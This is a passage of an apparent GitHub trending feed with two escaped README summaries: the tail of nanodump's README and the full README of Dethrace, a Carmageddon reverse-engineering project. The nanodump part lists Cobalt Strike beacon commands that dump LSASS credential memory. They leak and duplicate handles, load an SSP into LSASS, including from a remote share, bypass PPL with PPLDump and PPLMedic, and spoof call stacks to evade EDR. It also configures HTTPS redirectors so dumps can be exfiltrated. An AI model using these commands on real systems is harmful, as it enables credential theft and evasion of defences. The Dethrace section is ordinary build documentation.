align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--fork&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--snapshot&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SSP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PPL_DUMP&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;PPL_MEDIC&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2 id=&#34;examples&#34;&gt;4. Examples&lt;/h2&gt; &#xA;&lt;p&gt;Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --fork --write C:\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump with a valid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --seclogon-leak-remote C:\Windows\notepad.exe --fork --valid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get a handle with seclogon leak local, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --seclogon-leak-local --fork --valid --write C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Download the dump with an invalid signature (default):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Duplicate an existing handle and write the dump to disk with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --duplicate --write C:\Windows\Temp\report.docx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get the PID of LSASS:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --getpid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Load nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp&#xA;beacon&amp;gt; delete_file C:\Windows\Temp\[RANDOM].dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Load nanodump in LSASS as an SSP remotely:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump LSASS bypassing PPL using the PPLDump exploit, duplicating the handle that csrss.exe has on LSASS:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl_dump --duplicate --write C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump LSASS bypassing PPL using the PPLMedic exploit, opening a low privileged handle to LSASS and then elevating it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl_medic --elevate-handle --write C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --seclogon-duplicate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Make the WerFault.exe process create a full memory dump in the Temp folder:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --werfault C:\Windows\Temp\&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Open a handle to LSASS with an invalid callstack and download the minidump with an invalid signature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --spoof-callstack svchost&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the Shtinkering techinque:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --shtinkering&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Obtain a handle using seclogon leak local and create the dump using the Shtinkering techinque:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --seclogon-leak-local --shtinkering&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Obtain a handle with low privs and elevate it using &lt;em&gt;elevate handle&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --elevate-handle&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Obtain a handle with low privs using a valid calling stack and elevate it using &lt;em&gt;elevate handle&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --elevate-handle --spoof-callstack rpc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Duplicate an existing low priv handle and elevate it using &lt;em&gt;elevate handle&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --duplicate-elevate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;redirectors&#34;&gt;5. HTTPS redirectors&lt;/h2&gt; &#xA;&lt;p&gt;If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.&lt;br&gt; Increase the max size of requests on your web server to allow nanodump to download the dump.&lt;/p&gt; &#xA;&lt;h4&gt;NGINX&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;location ~ ^...$ {&#xA;    ...&#xA;    client_max_body_size 50M;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Apache2&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;Directory &#34;...&#34;&amp;gt;&#xA;    LimitRequestBody  52428800&#xA;&amp;lt;/Directory&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;skelsec&lt;/a&gt; for writing &lt;a href=&#34;https://github.com/skelsec/minidump&#34;&gt;minidump&lt;/a&gt;, which was crucial for learning the minidump file format.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/freefirex2&#34;&gt;freefirex&lt;/a&gt; from &lt;a href=&#34;https://github.com/trustedsec/CS-Situational-Awareness-BOF&#34;&gt;CS-Situational-Awareness-BOF&lt;/a&gt; at Trustedsec for many cool tricks for BOFs&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/Jackson_T&#34;&gt;Jackson_T&lt;/a&gt; for &lt;a href=&#34;https://github.com/jthuraisamy/SysWhispers2&#34;&gt;SysWhispers2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/BillDemirkapi&#34;&gt;BillDemirkapi&lt;/a&gt; for &lt;a href=&#34;https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/&#34;&gt;Process Forking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/splinter_code&#34;&gt;Antonio Cocomazzi&lt;/a&gt; for &lt;a href=&#34;https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html&#34;&gt;Abusing leaked handles to dump LSASS memory&lt;/a&gt; and &lt;a href=&#34;https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html&#34;&gt;Racing for LSASS dumps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/_xpn_&#34;&gt;xpn&lt;/a&gt; for &lt;a href=&#34;https://blog.xpnsec.com/exploring-mimikatz-part-2/&#34;&gt;Exploring Mimikatz - Part 2 - SSP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/matteomalvica&#34;&gt;Matteo Malvica&lt;/a&gt; for &lt;a href=&#34;https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/&#34;&gt;Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;James Forshaw&lt;/a&gt; for &lt;a href=&#34;https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html&#34;&gt;Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/itm4n&#34;&gt;itm4n&lt;/a&gt; for the original PPL userland exploits implementation, &lt;a href=&#34;https://github.com/itm4n/PPLdump&#34;&gt;PPLDump&lt;/a&gt; and &lt;a href=&#34;https://github.com/itm4n/PPLmedic&#34;&gt;PPLMedic&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mobile.twitter.com/asaf_gilboa&#34;&gt;Asaf Gilboa&lt;/a&gt; for &lt;a href=&#34;https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2&#34;&gt;Lsass Memory Dumps are Stealthier than Ever Before - Part 2&lt;/a&gt; and the Shtinkering technique&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/joehowwolf&#34;&gt;William Burgess&lt;/a&gt; for &lt;a href=&#34;https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs&#34;&gt;Spoofing Call Stacks To Confuse EDRs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/thefLinkk&#34;&gt;Sebastian Feldmann&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/testert01&#34;&gt;Fabian&lt;/a&gt; for the &lt;em&gt;elevate handle&lt;/em&gt; technique discussed at &lt;a href=&#34;https://www.youtube.com/watch?v=AucQUjJBJuw&#34;&gt;Morph Your Malware!&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>dethrace-labs/dethrace</title>
    <updated>2023-05-02T01:31:59Z</updated>
    <id>tag:github.com,2023-05-02:/dethrace-labs/dethrace</id>
    <link href="https://github.com/dethrace-labs/dethrace" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Reverse engineering the 1997 game &#34;Carmageddon&#34;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Dethrace&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/jeff-1amstudios/dethrace/actions/workflows/workflow.yml&#34;&gt;&lt;img src=&#34;https://github.com/jeff-1amstudios/dethrace/actions/workflows/workflow.yml/badge.svg?sanitize=true&#34; alt=&#34;Workflow&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/dethrace_labs&#34;&gt;&lt;img src=&#34;https://badgen.net/badge/icon/twitter?icon=twitter&amp;amp;label&#34; alt=&#34;Twitter&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/f5StsuP&#34;&gt;&lt;img src=&#34;https://badgen.net/badge/icon/discord?icon=discord&amp;amp;label&#34; alt=&#34;Discord Carmageddon server&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Want to chat? We are in the &lt;code&gt;#dethrace&lt;/code&gt; channel on the Carmageddon discord server.&lt;/p&gt; &#xA;&lt;p&gt;Dethrace is an attempt to learn how the 1997 driving/mayhem game &lt;a href=&#34;https://en.wikipedia.org/wiki/Carmageddon&#34;&gt;Carmageddon&lt;/a&gt; works behind the scenes and rebuild it to run natively on modern systems.&lt;/p&gt; &#xA;&lt;h2&gt;Progress&lt;/h2&gt; &#xA;&lt;p&gt;(Follow us on Twitter to get notified of updates!)&lt;/p&gt; &#xA;&lt;h4&gt;Last updated April 18 2023&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;80% of functions implemented&lt;/li&gt; &#xA; &lt;li&gt;Latest screenshot:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img width=&#34;752&#34; alt=&#34;Screenshot 2023-03-31 at 8 51 05 pm&#34; src=&#34;https://user-images.githubusercontent.com/78985374/232941148-165792a2-faf0-49bf-aa95-08e34de8ca33.png&#34;&gt; &#xA;&lt;h2&gt;Background&lt;/h2&gt; &#xA;&lt;p&gt;Watcom debug symbols for an earlier internal build &lt;a href=&#34;http://1amstudios.com/2014/12/02/carma1-symbols-dumped&#34;&gt;were discovered&lt;/a&gt; named &lt;code&gt;DETHRSC.SYM&lt;/code&gt; on the &lt;a href=&#34;http://carmageddon.wikia.com/wiki/Carmageddon_Splat_Pack&#34;&gt;Carmageddon Splat Pack&lt;/a&gt; expansion CD release. The symbols unfortunately did not match any known released executable, meaning they were interesting but not immediately usable to reverse engineer the game.&lt;/p&gt; &#xA;&lt;p&gt;This is what it looked like from the Watcom debugger - the names of all the methods were present but the code location they were pointing to was junk:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://1amstudios.com/img/watcom-debugger.jpg&#34; alt=&#34;watcom-debugger&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;CrayzKirk&lt;/em&gt; from the Carmageddon community picked it up and did a lot of painstaking work manually matching up many functions and data structures in the DOS executable to the debugging symbols.&lt;/p&gt; &#xA;&lt;p&gt;We are slowly replacing the original assembly code with equivalent C code, function by function.&lt;/p&gt; &#xA;&lt;h3&gt;Is &#34;dethrace&#34; a typo?&lt;/h3&gt; &#xA;&lt;p&gt;No, well, I don&#39;t think so at least. The original files according to the symbol dump were stored in &lt;code&gt;c:\DETHRACE&lt;/code&gt;, and the symbol file is called &lt;code&gt;DETHSRC.SYM&lt;/code&gt;. Maybe they removed the &#34;a&#34; to be compatible with &lt;a href=&#34;https://en.wikipedia.org/wiki/8.3_filename&#34;&gt;8.3 filenames&lt;/a&gt;?&lt;/p&gt; &#xA;&lt;h2&gt;Game content&lt;/h2&gt; &#xA;&lt;p&gt;Dethrace does not ship with any game content. You&#39;ll need access to the data from the original game. If you don&#39;t have an original CD then you can &lt;a href=&#34;https://www.gog.com/game/carmageddon_max_pack&#34;&gt;buy Carmageddon from GoG.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;dethrace&lt;/code&gt; also supports the various freeware demos:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rr2000.cwaboard.co.uk/R4/PC/carmdemo.zip&#34;&gt;Original Carmageddon demo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rr2000.cwaboard.co.uk/R4/PC/splatdem.zip&#34;&gt;Splat Pack demo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rr2000.cwaboard.co.uk/R4/PC/Splatpack_christmas_demo.zip&#34;&gt;Splat Pack Xmas demo&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Lots of other fun things are available from the &lt;a href=&#34;https://rr2000.cwaboard.co.uk/pc-files#c1&#34;&gt;Road Reaction site&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Dependencies&lt;/h2&gt; &#xA;&lt;h3&gt;SDL2&lt;/h3&gt; &#xA;&lt;p&gt;The easiest way to install SDL is via your favorite package manager.&lt;/p&gt; &#xA;&lt;p&gt;OSX:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;brew install SDL2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Linux:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;apt-get install libsdl2-dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Point Dethrace at the Carmageddon install directory:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export DETHRACE_ROOT_DIR=/path/to/carmageddon&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;p&gt;Dethrace uses &lt;a href=&#34;https://cmake.org/&#34;&gt;cmake&lt;/a&gt; for generating build files.&lt;/p&gt; &#xA;&lt;p&gt;To generate the build files (generally only required once):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkdir build&#xA;cd build&#xA;cmake ..&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On cmake has generated the build files for your platform, run the build. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run&lt;/h3&gt; &#xA;&lt;p&gt;After building, &lt;code&gt;build/dethrace&lt;/code&gt; is created&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./dethrace [args]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Run tests&lt;/h2&gt; &#xA;&lt;p&gt;A subset of tests do not require &lt;code&gt;DETHRACE_ROOT_DIR&lt;/code&gt;. They run via Github actions when code is committed to this repo. This allows us to keep nice and clean and avoid storing any potentially legally problematic resouces in our repo.&lt;/p&gt; &#xA;&lt;p&gt;The majority of tests &lt;em&gt;do&lt;/em&gt; require &lt;code&gt;DETHRACE_ROOT_DIR&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To run the full test suite, you must have a copy of the original &lt;em&gt;Splat Pack&lt;/em&gt; data.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export DETHRACE_ROOT_DIR=/path/to/carmageddon_splat_pack&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To run&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./dethrace_test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To run a single test&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;DETHRACE_TEST_ARGS=&#34;-n test_name&#34; make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Changelog&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dethrace-labs/dethrace/main/docs/CHANGELOG.md&#34;&gt;From the beginning until release&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CrayzKirk (manually matching up functions and data structures in the executable to the debugging symbols)&lt;/li&gt; &#xA; &lt;li&gt;The developer at Stainless Software who left an old debugging .SYM file on the Splat Pack CD ;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Legal&lt;/h2&gt; &#xA;&lt;p&gt;Dethrace is released to the Public Domain. The documentation and function provided by Dethrace may only be utilized with assets provided by ownership of Carmageddon.&lt;/p&gt; &#xA;&lt;p&gt;The source code in this repository is for non-commerical use only. If you use the source code you may not charge others for access to it or any derivative work thereof.&lt;/p&gt; &#xA;&lt;p&gt;Dethrace and any of its&#39; maintainers are in no way associated with or endorsed by SCi, Stainless Software or THQ Nordic.&lt;/p&gt;</summary>
  </entry>
</feed>